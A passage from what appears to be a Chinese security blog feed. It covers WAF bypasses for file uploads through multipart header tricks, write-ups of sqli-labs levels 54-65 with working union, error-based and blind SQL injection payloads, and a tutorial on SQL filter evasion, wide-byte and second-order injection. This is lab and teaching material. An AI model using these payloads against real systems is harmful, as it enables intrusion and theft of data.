alt="image-20210215001504949"></li><li>将垃圾数据加到Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。</li></ul><p><strong>多个filename</strong></p><p>早期版本安全狗，可以多加一个filename</p><pre><code class="hljs routeros">Content-Disposition: form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;file_x&quot;</span>; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;test.txt&quot;</span>; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;test.php&quot;</span></code></pre><p>最终上传成功的文件名是test.php。但是由于解析文件名时，会解析到第一个。正则默认都会匹配到第一个。</p><p><strong>交换name和filename的顺序</strong></p><p>规定Content-Disposition必须在最前面，所以只能交换name和filename的顺序。有的WAF可能会匹配name在前面，filename在后面，所以下面姿势会导致Bypass。</p><pre><code class="hljs routeros">Content-Disposition: form-data; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;xx.php&quot;</span>; <span class="hljs-attribute">name</span>=file_x</code></pre><p><strong>修改引号</strong></p><pre><code class="hljs routeros">Content-Disposition: form-data; <span class="hljs-attribute">name</span>=file_x; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;xx.php&quot;</span>Content-Disposition: form-data; <span class="hljs-attribute">name</span>=file_x; <span class="hljs-attribute">filename</span>=xx.phpContent-Disposition: form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;file_x&quot;</span>; <span class="hljs-attribute">filename</span>=xx.phpContent-Disposition: form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&#x27;file_x&#x27;</span>; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&#x27;xx.php&#x27;</span>Content-Disposition: form-data; <span class="hljs-attribute">name</span>=file_x; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;xx.php&quot;</span><span class="hljs-string">&quot;</span></code></pre><p>单引号、双引号、不要引号，都能上传。</p><p><strong>大小写</strong></p><p>对这三个固定的字符串进行大小写转换</p><ul><li>Content-Disposition</li><li>name</li><li>filename </li></ul><p><strong>空格</strong></p><p>在: ; =添加1个或者多个空格。</p><p><strong>去掉或修改Content-Disposition值</strong></p><p>有的WAF在解析的时候，认为Content-Disposition值一定是form-data，造成绕过。</p><pre><code class="hljs routeros">Content-Disposition: <span class="hljs-attribute">name</span>=<span class="hljs-string">&#x27;file_x&#x27;</span>; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&#x27;xx.php&#x27;</span></code></pre><p><strong>多个boundary</strong></p><p>最后上传的文件是test.php而非test.txt，但是取的文件名只取了第一个就会被Bypass。</p><pre><code class="hljs pgsql"><span class="hljs-comment">------WebKitFormBoundaryj1oRYFW91eaj8Ex2</span>Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file_x&quot;; filename=&quot;test.txt&quot;Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/javascript<span class="hljs-comment">------WebKitFormBoundaryj1oRYFW91eaj8Ex2</span>Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file_x&quot;; filename=&quot;test.php&quot;Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/javascript</code></pre><p><strong>多个分号</strong></p><p>文件解析时，可能解析不到文件名，导致绕过。</p><pre><code class="hljs routeros">Content-Disposition: form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;file_x&quot;</span>;;; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;test.php&quot;</span></code></pre><p><strong>Header在boundary前添加任意字符</strong></p><p>PHP支持，JAVA报错</p><pre><code class="hljs apache"><span class="hljs-attribute">Content</span>-Type: multipart/form-data; bypassboundary=----WebKitFormBoundaryj<span class="hljs-number">1</span>oRYFW<span class="hljs-number">91</span>eaj<span class="hljs-number">8</span>Ex<span class="hljs-number">2</span></code></pre><p>** filename换行**</p><p>PHP支持，Java不支持</p><pre><code class="hljs applescript">Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;file_x&quot;</span>; <span class="hljs-built_in">file</span><span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;test.php&quot;</span></code></pre><p><strong>name和filename添加任意字符串</strong></p><p>PHP支持，Java不支持</p><pre><code class="hljs routeros">Content-Disposition: <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;file_x&quot;</span>; bypass waf upload; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;test.php&quot;</span>;</code></pre><h4 id="3-文件内容"><a href="#3-文件内容" class="headerlink" title="3.文件内容"></a>3.文件内容</h4><p>针对文件内容检测的绕过，一般有两种方式，</p><pre><code class="hljs angelscript"><span class="hljs-number">1.</span>制作图片马<span class="hljs-number">2.</span>文件幻术头绕过</code></pre><p>另外呢就是对敏感的函数进行检测，比如exec()、eval()这些函数，对应的解决方法是进行替换或者”变形“</p><p><strong>POST/GET</strong></p><p>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。<br>此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</p><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h2><p>现在基本上很难遇到能够上传恶意文件的漏洞了，一般是结合cms漏洞和各种cve(我一般是这样的、、、)，因为很难遇到逻辑有问题的代码了，这就体现了前期信息收集的重要性了。</p><p>参考：<a href="https://xz.aliyun.com/t/2657#toc-13">https://xz.aliyun.com/t/2657#toc-13</a></p><p><a href="http://www.libpng.org/pub/png/spec/1.2/PNG-Chunks.html#C.Critical-chunks">http://www.libpng.org/pub/png/spec/1.2/PNG-Chunks.html#C.Critical-chunks</a></p><p><a href="https://secgeek.net/bookfresh-vulnerability/">https://secgeek.net/bookfresh-vulnerability/</a></p><p><a href="https://zhzhdoai.github.io/2019/07/10/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">https://zhzhdoai.github.io/2019/07/10/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</a></p><p><a href="https://yinwc.github.io/2020/04/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">https://yinwc.github.io/2020/04/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</a></p><p><a href="https://www.secpulse.com/archives/117827.html">https://www.secpulse.com/archives/117827.html</a></p><p><a href="https://www.anquanke.com/post/id/164561#h2-1">https://www.anquanke.com/post/id/164561#h2-1</a></p><p><a href="https://www.anquanke.com/post/id/153376">https://www.anquanke.com/post/id/153376</a></p><p><a href="https://masterxsec.github.io/2017/04/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/">https://masterxsec.github.io/2017/04/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/</a></p><p><a href="https://www.dazhuanlan.com/2019/11/04/5dbfacb696546/">https://www.dazhuanlan.com/2019/11/04/5dbfacb696546/</a></p><p><a href="https://mp.weixin.qq.com/s/lM8XeOpxP1871U_3EVPCDg">https://mp.weixin.qq.com/s/lM8XeOpxP1871U_3EVPCDg</a></p><p><a href="https://choge.top/2020/02/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%AB%98%E7%BA%A7%E5%88%A9%E7%94%A8/">https://choge.top/2020/02/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%AB%98%E7%BA%A7%E5%88%A9%E7%94%A8/</a></p><p><a href="https://www.anquanke.com/post/id/164561">https://www.anquanke.com/post/id/164561</a></p><p><a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p><p><a href="https://www.hacking8.com/MiscSecNotes/bypass-waf-cookbook.html">https://www.hacking8.com/MiscSecNotes/bypass-waf-cookbook.html</a></p><p><a href="https://weibo.com/ttarticle/p/show?id=2309404007261092631700&amp;sudaref=www.google.com.hk&amp;display=0&amp;retcode=6102">https://weibo.com/ttarticle/p/show?id=2309404007261092631700&amp;sudaref=www.google.com.hk&amp;display=0&amp;retcode=6102</a></p><p><a href="https://www.cnblogs.com/-qing-/p/10832850.html">https://www.cnblogs.com/-qing-/p/10832850.html</a></p><p><a href="https://huyuanzhi2.github.io/2020/04/02/bypass-waf-upload-jsp/">https://huyuanzhi2.github.io/2020/04/02/bypass-waf-upload-jsp/</a></p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>sql-labs记录3</title>
    <link href="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%953/"/>
    <url>/2020/06/01/sql-labs%E8%AE%B0%E5%BD%953/</url>
    
    <content type="html"><![CDATA[<p>本文记录sqli-labs第54-65关，也算是踩了很多坑吧</p><a id="more"></a><h2 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1.基础知识"></a>1.基础知识</h2><h3 id="1-判断闭合"><a href="#1-判断闭合" class="headerlink" title="1.判断闭合"></a>1.判断闭合</h3><p>之前判断闭合直接是上符号再闭合进行判断，这样是不对的，容易出错，应该采用以下方式:来源于Y4tacker</p><p>判断闭合方式，目前常用的闭合方式为单引号’’，单引号括号(’’)，双引号””，双引号括号(“”)</p><h4 id="1-常规判断方法"><a href="#1-常规判断方法" class="headerlink" title="1.常规判断方法"></a>1.常规判断方法</h4><p>1.首先尝试：</p><pre><code class="hljs sql">?id=1’?id=1”</code></pre><ul><li>如果都报错，则为整形闭合。</li></ul><p>2.如果单引号报错，双引号不报错。然后尝试</p><ul><li><pre><code class="sql">?id=1&#39; --+?id=1&#39; #  <pre><code class="hljs routeros">+ 无报错则单引号闭合。报错则单引号加括号。3.如果单引号不报错，双引号报错。然后尝试```sql?<span class="hljs-attribute">id</span>=1&quot; --+?<span class="hljs-attribute">id</span>=1&quot; #</code></pre></code></pre></li><li><p>无报错则双引号闭合。报错则双引号加括号。</p></li></ul><h4 id="2-真假值判断"><a href="#2-真假值判断" class="headerlink" title="2.真假值判断"></a>2.真假值判断</h4><p>1.输入（其中id=1,1是正确的数据库存在的值），正常回显</p><pre><code class="hljs sql">?id=1 and true <span class="hljs-comment">--+</span>或者?id=true and true <span class="hljs-comment">--+</span></code></pre><p>输入，错误回显</p><pre><code class="hljs sql">?id=1 and false <span class="hljs-comment">--+</span>或者?id=true and false <span class="hljs-comment">--+</span></code></pre><p>那么就是整形闭合</p><p>2.输入（其中id=1,1是正确的数据库存在的值），正常回显</p><pre><code class="hljs sql">?id=1’ and true <span class="hljs-comment">--+</span>或者?id=true‘ and true <span class="hljs-comment">--+</span></code></pre><p>输入，错误回显</p><pre><code class="hljs sql">?id=1’ and false <span class="hljs-comment">--+</span>或者?id=true‘ and false <span class="hljs-comment">--+</span></code></pre><p>那么就是单引号闭合，其他符号同理</p><h4 id="3-order-by闭合方式判断"><a href="#3-order-by闭合方式判断" class="headerlink" title="3.order by闭合方式判断()"></a>3.order by闭合方式判断()</h4><p>是否存在注入，若结果不同，就是存在注入，可以往下进行，若结果相同，判断是否为字符注入</p><pre><code class="hljs sql">?sort=1 desc?sort=1 asc</code></pre><p>是否为数字注入，显示结果不同，则为数字注入，相同，则往下进行</p><pre><code class="hljs sql">?sort=right(version(),1)?sort=left(version(),1)</code></pre><p>是否为布尔类型，此时我们可以用报错注入和延时注入</p><pre><code class="hljs sql">?sort=rand(true)?sort=rand(false)</code></pre><p>是否为字符注入，回显结果不一样，就说明闭合方式为单引号，其他闭合方式（双引号，单引号括号，双引号括号）同理</p><pre><code class="hljs sql">?sort=1?sort=1&#x27;</code></pre><h3 id="2-判断字段数"><a href="#2-判断字段数" class="headerlink" title="2.判断字段数"></a>2.判断字段数</h3><p>按照惯性思维，一般都是order by进行判断，但有时候不一定会成功，就应该考虑其他方式了。</p><h4 id="1-order-by"><a href="#1-order-by" class="headerlink" title="1.order by"></a>1.order by</h4><p>语法：<code>?id=1&#39; order by 1,2,3--+</code></p><h4 id="2-union-select"><a href="#2-union-select" class="headerlink" title="2.union select"></a>2.union select</h4><p>语法：<code>?id=1&#39; union select 1,2,3--+</code></p><p>在这里要说一点就是括号的优先级大于单双引号，如果我们遇到 字符型带括号类型注入，如字符型单引号小括号，如果我们在url中输入?id=1)–+ ?id=1”)–+ 由于优先级的问题页面是会返回正常，但后台数据库并没有成功的进行闭合，使用union注入后都无法成功进行注入。</p><h2 id="2-靶场记录"><a href="#2-靶场记录" class="headerlink" title="2.靶场记录"></a>2.靶场记录</h2><h3 id="Less54：GET-union查询-每轮允许10次"><a href="#Less54：GET-union查询-每轮允许10次" class="headerlink" title="Less54：GET-union查询-每轮允许10次"></a>Less54：GET-union查询-每轮允许10次</h3><blockquote><table bgcolor="#7FFFD4">题目要求：The objective of this challenge is to dump the (secret key) from only random table from Database ('CHALLENGES') in Less than 10 attempts. For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.</table><table bgcolor="#7FFFD4">意思就是此挑战的目标是在不到10次的尝试中从数据库（challenges）的随机表中转储（密钥）。超过10此就会重置，每次都会生成随机表名、列名和表数据。</table></blockquote><p> 第一关先按正常步骤来，后面的直接贴关键的了</p><p>1.找闭合，单引号闭合</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222143225062.png" alt="image-20210222143225062"><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222143241840.png" alt="image-20210222143241840"></p><p>单引号不正常，双引号正常，则闭合为单引号</p><p>2.找字段数：3</p><p>这一步试了很多，注释符用<code>#</code>注释不了，只能用<code>--+</code>，而且不能用<code>order by</code>进行判断，只能用 <code>union select</code></p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222143750422.png" alt="image-20210222143750422"><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222143813899.png" alt="image-20210222143813899"></p><p>3.爆数据库，这一关已经给出数据库是’CHALLENGES’了，所以不用查了，但是往往需要自己查，payload如下</p><p><code>?id=-1&#39; union select 1,concat_ws(&#39;|&#39;,database(),version(),@@datadir,@@version_compile_os),user()  --+</code></p><p>4.爆表名：</p><p>payload:<code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;CHALLENGES&#39; --+</code></p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222141724070.png" alt="image-20210222141724070"></p><p>5.爆字段</p><p>payload：<code>?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;challenges&#39; and table_name=&#39;5t0md80073&#39;--+</code></p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222141842212.png" alt="image-20210222141842212"></p><p>有一个secret_9PML，猜测 Secret Key在这个里面</p><p>6.爆数据</p><p>payload：<code>?id=-1&#39; union select 1,2,group_concat(secret_9PML) from challenges.5t0md80073--+</code></p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222142214759.png" alt="image-20210222142214759"></p><p>7.验证结果，正确！</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222142251627.png" alt="image-20210222142251627"></p><h3 id="Less55：GET-union查询-每轮允许14次-1"><a href="#Less55：GET-union查询-每轮允许14次-1" class="headerlink" title="Less55：GET-union查询-每轮允许14次-1"></a>Less55：GET-union查询-每轮允许14次-1</h3><p>判断闭合</p><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1                正确回显?<span class="hljs-attribute">id</span>=1&#x27;      无错误异常回显?<span class="hljs-attribute">id</span>=1&quot;      无错误异常回显#是数字型所以单双引号都会报错?<span class="hljs-attribute">id</span>=1&#x27;)--+   无错误异常回显#要注意的是这里使用union注入发现单单一个数字型无法注入成功的时候就要考虑是否含有小括号?<span class="hljs-attribute">id</span>=1&quot;)--+   无错误异常回显?<span class="hljs-attribute">id</span>=1)--+    正确回显</code></pre><p>除了闭合不一样，其余都和54关一样</p><h3 id="Less56：GET-union查询-每轮允许14次-2"><a href="#Less56：GET-union查询-每轮允许14次-2" class="headerlink" title="Less56：GET-union查询-每轮允许14次-2"></a>Less56：GET-union查询-每轮允许14次-2</h3><p>判断回显</p><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1          正确回显?<span class="hljs-attribute">id</span>=1&quot;          正确回显?<span class="hljs-attribute">id</span>=1&#x27;          无错误异常回显?<span class="hljs-attribute">id</span>=1&#x27;--+      无错误异常回显?<span class="hljs-attribute">id</span>=1&#x27;)--+    正常回显格外说明：（这种情况只出现在字符型注入中，造成这样的原因是括号的优先级高。如果是数字型带括号下面的语句会直接报错的，）?<span class="hljs-attribute">id</span>=1)--+     虽然正确回显,但是后台数据库并没有闭合成功，无法进行注入?<span class="hljs-attribute">id</span>=1&quot;)--+   虽然正确回显，但是后台数据库并没有闭合成功，无法进行注入</code></pre><p>其他都一样</p><h3 id="Less57：GET-union查询-每轮允许14次-3"><a href="#Less57：GET-union查询-每轮允许14次-3" class="headerlink" title="Less57：GET-union查询-每轮允许14次-3"></a>Less57：GET-union查询-每轮允许14次-3</h3><p>判断闭合</p><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27;正确回显?<span class="hljs-attribute">id</span>=1&quot;异常回显?<span class="hljs-attribute">id</span>=1&quot;异常回显?<span class="hljs-attribute">id</span>=1&quot;--+异常回显?<span class="hljs-attribute">id</span>=1&quot;)--+正常回显</code></pre><p>其他都一样。</p><h3 id="Less58：GET-双查询-每轮允许5次-1"><a href="#Less58：GET-双查询-每轮允许5次-1" class="headerlink" title="Less58：GET-双查询-每轮允许5次-1"></a>Less58：GET-双查询-每轮允许5次-1</h3><p>判断闭合</p><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27;异常回显?<span class="hljs-attribute">id</span>=1&quot;正常回显?<span class="hljs-attribute">id</span>=1&#x27; -- #正常回显</code></pre><p>这一关无法使用union查询，看图</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222235011326.png" alt="image-20210222235011326"><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222235043270.png" alt="image-20210222235043270"></p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222235600326.png" alt="image-20210222235600326" style="zoom: 67%;"><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%953/image-20210222235625583.png" alt="image-20210222235625583" style="zoom:80%;"></p><p>其他都一样</p><p> 使用group_concat()函数进行双注入报错</p><p>payload</p><pre><code class="hljs sql">表?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">count</span>(*),<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;-&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;challenges&#x27;</span>),<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>()*<span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a<span class="hljs-comment">--+</span>字段?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,count(*),concat_ws(&#x27;</span>-<span class="hljs-string">&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>challenges<span class="hljs-string">&#x27; and table_name=&#x27;</span>表名<span class="hljs-string">&#x27;),floor(rand()*2)) as a from information_schema.tables group by a--+</span><span class="hljs-string">信息</span><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">count</span>(*),<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;-&#x27;</span>,(<span class="hljs-keyword">select</span> 字段名 <span class="hljs-keyword">from</span> challenges.表),<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>()*<span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a<span class="hljs-comment">--+</span></code></pre><h3 id="Less59：GET-双查询-每轮允许5次-2"><a href="#Less59：GET-双查询-每轮允许5次-2" class="headerlink" title="Less59：GET-双查询-每轮允许5次-2"></a>Less59：GET-双查询-每轮允许5次-2</h3><p>为数字型注入，同58类似</p><h3 id="Less60：GET-双查询-每轮允许5次-3"><a href="#Less60：GET-双查询-每轮允许5次-3" class="headerlink" title="Less60：GET-双查询-每轮允许5次-3"></a>Less60：GET-双查询-每轮允许5次-3</h3><p>带括号的双引号字符型注入，参考58</p><h3 id="Less61：GET-双查询-每轮允许5次-4"><a href="#Less61：GET-双查询-每轮允许5次-4" class="headerlink" title="Less61：GET-双查询-每轮允许5次-4"></a>Less61：GET-双查询-每轮允许5次-4</h3><p>带两个小括号的单引号字符型，参考58</p><h3 id="Less62：GET-盲注-每轮允许130次-1"><a href="#Less62：GET-盲注-每轮允许130次-1" class="headerlink" title="Less62：GET-盲注-每轮允许130次-1"></a>Less62：GET-盲注-每轮允许130次-1</h3><p> 字符型单引号加小括号闭合，没有报错回显信息，无法利用报错注入，</p><p><code>?id=1&#39;) union select 1,2,3-- #</code> 无法有效的回显我们需要的信息，也就是说无法进行union联合注入，那么我们只能进行盲注了,参考Less-8，利用二分法进行布尔盲注</p><h3 id="Less63：GET-盲注-每轮允许130次-2"><a href="#Less63：GET-盲注-每轮允许130次-2" class="headerlink" title="Less63：GET-盲注-每轮允许130次-2"></a>Less63：GET-盲注-每轮允许130次-2</h3><p><code>&#39;</code>闭合,其他一样</p><h3 id="Less64：GET-盲注-每轮允许130次-3"><a href="#Less64：GET-盲注-每轮允许130次-3" class="headerlink" title="Less64：GET-盲注-每轮允许130次-3"></a>Less64：GET-盲注-每轮允许130次-3</h3><p><code>1))</code>闭合，其他一样</p><h3 id="Less65GET-盲注-每轮允许130次-4"><a href="#Less65GET-盲注-每轮允许130次-4" class="headerlink" title="Less65GET-盲注-每轮允许130次-4"></a>Less65GET-盲注-每轮允许130次-4</h3><p><code>&quot;)</code>闭合，其他一样</p><p>后面的关卡没有源码了。。。</p><p>参考：<a href="https://blog.csdn.net/weixin_39934520/article/list/8">https://blog.csdn.net/weixin_39934520/article/list/8</a></p><p>里面很多tips我没有考虑到</p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>sql-labs记录2</title>
    <link href="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/"/>
    <url>/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/</url>
    
    <content type="html"><![CDATA[<p>本文记录sqL-Labs的23-53关，这个系列开始不会一步步按照sql注入的步骤来了，会直接给出结果和思路。</p><a id="more"></a><h2 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1.基础知识"></a>1.基础知识</h2><h3 id="1-绕过sql过滤与转义"><a href="#1-绕过sql过滤与转义" class="headerlink" title="1.绕过sql过滤与转义"></a>1.绕过sql过滤与转义</h3><p>为了防止sql注入攻击，往往在与数据库进行交互之前会进行参数转义过滤等操作。</p><h4 id="1-绕过关键字过滤"><a href="#1-绕过关键字过滤" class="headerlink" title="1.绕过关键字过滤"></a>1.绕过关键字过滤</h4><p>1.注释符绕过：sel/**/ect</p><p>2.大小写绕过：SelEct</p><p>3.双写绕过：selselectect</p><p>4.符号绕过：and&lt;=&gt;&amp;&amp;，or&lt;=&gt;||，xor&lt;=&gt;|，not&lt;=&gt;!</p><p>5.尖括号绕过：sele&lt;&gt;ct</p><p>6.编码绕过：url编码绕过、16进制编码绕过、ASCII编码绕过、HEX、unicode编码绕过</p><p>7.等价函数绕过</p><pre><code class="hljs erlang"><span class="hljs-function"><span class="hljs-title">hex</span><span class="hljs-params">()</span>、<span class="hljs-title">bin</span><span class="hljs-params">()</span> ==&gt; <span class="hljs-title">ascii</span><span class="hljs-params">()</span></span><span class="hljs-function"><span class="hljs-title">sleep</span><span class="hljs-params">()</span> ==&gt;<span class="hljs-title">benchmark</span><span class="hljs-params">()</span></span><span class="hljs-function"><span class="hljs-title">concat_ws</span><span class="hljs-params">()</span>==&gt;<span class="hljs-title">group_concat</span><span class="hljs-params">()</span></span><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">()</span>、<span class="hljs-title">substr</span><span class="hljs-params">()</span> ==&gt; <span class="hljs-title">substring</span><span class="hljs-params">()</span></span><span class="hljs-function">@@<span class="hljs-title">user</span> ==&gt; <span class="hljs-title">user</span><span class="hljs-params">()</span></span><span class="hljs-function">@@<span class="hljs-title">datadir</span> ==&gt; <span class="hljs-title">datadir</span><span class="hljs-params">()</span></span><span class="hljs-function">还有参考下面的绕过逗号过滤，这些都是相通的</span></code></pre><p>8.生僻函数代替，例如报错注入中的polygon</p><h4 id="2-绕过特殊字符过滤"><a href="#2-绕过特殊字符过滤" class="headerlink" title="2.绕过特殊字符过滤"></a>2.绕过特殊字符过滤</h4><p>1.绕过注释符过滤：</p><pre><code class="hljs angelscript">使用<span class="hljs-keyword">or</span>‘<span class="hljs-number">1</span>代替注释符</code></pre><p>1.绕过空格过滤：</p><pre><code class="hljs angelscript">双空格、<span class="hljs-comment">/**/</span>代替空格、()代替空格、回车代替空格、tab代替空格、`代替空格编码代替空格:%<span class="hljs-number">09</span> TAB（水平），%<span class="hljs-number">0</span>a 新建一行，%<span class="hljs-number">0</span>c 新的一页，%<span class="hljs-number">0</span>d <span class="hljs-keyword">return</span>功能，%<span class="hljs-number">0</span>b TAB键(垂直),%a0 空格</code></pre><p>2.绕过引号过滤：</p><pre><code class="hljs lsl">编码进行绕过<span class="hljs-number">16</span>进制绕过：table_name=<span class="hljs-string">&quot;users&quot;</span>等价于table_name=<span class="hljs-number">0x7573657273</span>因为hex(users)=<span class="hljs-number">7573657273</span>宽字节注入</code></pre><p>3.绕过逗号过滤：</p><pre><code class="hljs pgsql"><span class="hljs-keyword">join</span>代替逗号<span class="hljs-keyword">from</span> pos <span class="hljs-keyword">for</span> len：substr(&quot;string&quot;,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)等价于substr(&quot;string&quot; <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">3</span>)<span class="hljs-keyword">like</span>：ascii(substr(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">114</span>等价于 <span class="hljs-keyword">user</span>() <span class="hljs-keyword">like</span> &quot;r%&quot;<span class="hljs-keyword">offset</span>：<span class="hljs-keyword">limit</span> <span class="hljs-number">2</span>,<span class="hljs-number">1</span>等价于<span class="hljs-keyword">limit</span> <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">2</span>。适用于<span class="hljs-keyword">limit</span>中的逗号被过滤的情况</code></pre><p>4.绕过等号过滤：<code>like</code>代替、<code>rlike</code>代替(模糊匹配)、<code>regexp</code>代替、<code>&lt;&gt;</code>等价于!=：!(id&lt;&gt;1)、<code>strcmp(str1,str2)</code>、<code>between   and</code>、<code>in</code></p><p>5.绕过<code>&lt;</code>、<code>&gt;</code>过滤：</p><pre><code class="hljs sql">greatest(n1,n2,n3,...) :返回其中的最大值strcmp(str1,str2) :当str1=str2，返回0，当str1&gt;str2，返回1，当str1&lt;str2，返回-1in 操作符between   and:选取介于两个值之间的数据范围。这些值可以是数值、文本或者日期。least(n1,n2,n3…):返回n中的最小值</code></pre><h4 id="3-寻找网站源ip绕过waf"><a href="#3-寻找网站源ip绕过waf" class="headerlink" title="3.寻找网站源ip绕过waf"></a>3.寻找网站源ip绕过waf</h4><p>对于具有云WAF防护的网站，只要找到网站的IP地址，通过IP访问网站，就可以绕过云WAF检测。</p><p>常见的寻找网站IP的方法由以下几种</p><ul><li>寻找网站的历史解析记录</li><li>多个不同区域ping网站，查看IP解析的结果</li><li>找网站的二级域名、NS、MX记录等对应的IP</li><li>订阅网站邮件，查看邮件发送方的IP</li></ul><h4 id="4-HTTP参数污染"><a href="#4-HTTP参数污染" class="headerlink" title="4.HTTP参数污染"></a>4.HTTP参数污染</h4><p>HTTP参数污染是指当同一个参数出现多次，不同的中间件会解析为不同的结果。index.php?id=1&amp;id=2获取到的参数具体如下图所示：</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210220124830619.png" alt="image-20210220124830619"></p><h4 id="5-另寻注入点"><a href="#5-另寻注入点" class="headerlink" title="5.另寻注入点"></a>5.另寻注入点</h4><p>往往对url请求过滤比较严重，对http头的过滤不是很严格，前提是将http的内容存进数据库。</p><h3 id="2-二次注入"><a href="#2-二次注入" class="headerlink" title="2.二次注入"></a>2.二次注入</h3><p>利用条件：</p><p>（1）向数据库成功插入恶意语句</p><p>（2）数据库取出数据时不进行转义或者过滤</p><p>攻击过程：</p><p>黑客寻找注入点向数据库中插入恶意代码，再向数据库做第二次请求将第一次注入的代码调用出来即可。</p><h3 id="3-宽字节注入"><a href="#3-宽字节注入" class="headerlink" title="3.宽字节注入"></a>3.宽字节注入</h3><p>利用条件：PHP连接MySQL的时候，设置了“set character_set_client = gbk”</p><p>原因：设置gbk之后，会导致编码转换的问题，gbk编码会认为两个ascii码为一个汉字，而必要条件是前一个ascii码大于 128 